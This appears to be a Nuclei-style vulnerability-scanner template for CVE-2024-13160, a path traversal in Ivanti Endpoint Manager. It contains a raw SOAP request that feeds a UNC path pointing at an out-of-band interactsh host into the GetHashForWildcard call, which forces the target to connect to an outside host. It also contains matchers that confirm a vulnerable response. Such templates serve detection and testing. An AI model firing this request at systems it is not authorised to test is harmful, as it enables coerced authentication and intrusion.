folder-6/poc-yaml-ivanti-epm-path-traversal-cve-2024-13160.yaml

id: ivanti-epm-path-traversal-cve-2024-13160
info:
  name: Ivanti EPM Path Traversal Vulnerability (CVE-2024-13160)
  author: ProjectDiscoveryAI
  severity: critical
  tags: directory-traversal,oast,cve-2024-13160

variables:
  reverse: '{{interactsh-url}}'
  file: '{{rand_base(5)}}'

http:
  - raw:
      - |
        POST /WSVulnerabilityCore/VulCore.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml
        Soapaction: http://tempuri.org/GetHashForWildcard

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
                <GetHashForWildcard xmlns="http://tempuri.org/">
                    <wildcard>\\{{reverse}}\tmp\{{file}}.txt</wildcard>
                </GetHashForWildcard>
            </soap:Body>
        </soap:Envelope>
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<GetHashForWildcardResponse"
        part: body
      - type: word
        words:
          - "text/xml"
        part: header
